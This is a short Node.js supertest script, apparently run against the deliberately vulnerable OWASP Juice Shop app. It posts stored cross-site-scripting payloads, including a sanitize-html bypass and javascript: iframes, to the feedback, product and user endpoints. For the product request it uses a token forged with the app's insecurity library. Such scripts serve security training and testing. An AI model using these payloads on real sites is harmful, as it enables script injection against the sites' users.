import request from 'supertest'
import * as security from './lib/insecurity'

async function main () {
  const { createApp } = await import('./server')
  const { app } = await createApp({ inMemoryDb: true })

  const feedbackRes = await request(app)
    .post('/api/Feedbacks')
    .set('content-type', 'application/json')
    .send({
      comment: 'The sanitize-html module up to at least version 1.4.2 has this issue: <<script>Foo</script>iframe src="javascript:alert(`xss`)">',
      rating: 1,
      captchaId: 'unused',
      captcha: 'unused'
    })
  console.log('feedback status', feedbackRes.status)
  console.log('feedback body', JSON.stringify(feedbackRes.body, null, 2))

  const productRes = await request(app)
    .post('/api/Products')
    .set({ Authorization: 'Bearer ' + security.authorize(), 'content-type': 'application/json' })
    .send({
      name: 'XSS Juice (42ml)',
      description: '<iframe src="javascript:alert(`xss`)">',
      price: 9999.99,
      image: 'xss3juice.jpg'
    })
  console.log('product status', productRes.status)
  console.log('product body', JSON.stringify(productRes.body, null, 2))

  const userRes = await request(app)
    .post('/api/Users')
    .set('content-type', 'application/json')
    .send({
      email: '<iframe src="javascript:alert(`xss`)">',
      password: 'does.not.matter'
    })
  console.log('user status', userRes.status)
  console.log('user body', JSON.stringify(userRes.body, null, 2))
}

main().catch(err => { console.error(err); process.exit(1) })
